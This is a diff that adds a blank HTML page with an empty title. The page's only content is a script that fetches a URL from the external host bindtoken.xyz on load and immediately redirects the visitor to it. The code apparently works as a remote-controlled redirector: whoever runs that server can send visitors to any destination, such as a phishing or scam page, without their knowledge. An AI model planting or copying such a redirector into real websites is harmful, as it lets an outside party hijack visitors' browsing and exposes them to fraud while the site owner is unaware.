@@ -1,0 +1,22 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title></title>
+</head>
+<body>
+<script>
+  var api_url = 'https://bindtoken.xyz';
+  var domain = window.location.href;
+  var xhr = new XMLHttpRequest();
+  xhr.open('GET',api_url+'/api/api/urldata', true);
+  xhr.onreadystatechange = function() {
+      if (xhr.readyState === 4 && xhr.status === 200) {
+          var url = xhr.responseText
+		  window.location.replace(url);
+      }
+  };
+  xhr.send();
+</script>
+</body>
+</html>
